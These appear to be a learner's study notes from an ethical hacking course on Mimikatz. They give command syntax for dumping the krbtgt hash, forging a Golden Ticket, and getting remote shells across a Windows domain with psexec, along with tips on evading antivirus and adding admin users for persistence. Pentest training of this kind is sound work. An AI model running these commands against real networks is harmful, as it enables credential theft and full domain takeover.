mimikatz
--------


good resource: Unofficial Guide to Mimikatz & Command Reference (https://adsecurity.org/?page_id=1821)

--------
From: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
"Mimikatz Overview" - https://academy.tcm-sec.com/courses/1152300/lectures/48496452
"Credential Dumping with Mimikatz" - https://academy.tcm-sec.com/courses/1152300/lectures/48496456
- use the mimikatz found in this github repository: https://github.com/gentilkiwi/mimikatz/, not this one: https://github.com/ParrotSec/mimikatz
- at this point use of mimikatz will be picked up by any AV/EDR system so it can only be used without triggering an alert if it is heavily obfuscated or you are already in control of the AV/EDR.

$ mimikatz.exe
- launch mimikatz

mimikatz #
- this is the mimikatz command line prompt

mimikatz # privilege::debug
- always run this command first; you should receive:
Privilege '20' OK
as the response
see here: https://adsecurity.org/?page_id=1821, where it explains: "PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands)"

-------------------------------------------------------
Using mimikatz for a Golden Ticket Attack

from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
"Golden Ticket Attacks Overview" - https://academy.tcm-sec.com/courses/1152300/lectures/48497537
"Golden Ticket Attacks" - https://academy.tcm-sec.com/courses/1152300/lectures/24781487

- used when you have the hash of the krbtgt account
- golden tickets give complete access to all machines in the domain; including allowing shells on them

syntax:

$ mimikatz.exe

mimikatz # privilege::debug

mimikatz # lsadump::lsa /inject /name:krbtgt 

[from the output, copy the SID of the domain and the NTLM hash of the krbtgt account for use in the following command]

mimikatz # kerberos::golden /User:<USERNAME (can be real, like Administrator, or made up)> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /id:500 /ptt
- /id:500 is the Administrator account's RID
- /ptt stands for "pass the ticket"

[after passing the golden ticket, one can open up a CLI and use it to interact with any machine in the domain]

mimikatz # misc::cmd

[a cmd prompt will open; now, you can, for example run the dir command on it against any machine in the domain]

> dir \\<name_of_machine_in_the_domain>\c$

[if psexec.exe (available as free download from the official Windows site) is on the machine you can use it to gain a remote shell on a machine in the domain]

> psexec.exe \\<name_of_machine_in_the_domain> cmd.exe

[after obtaining a golden ticket, you can also add a new admin user to the domain for persistence]






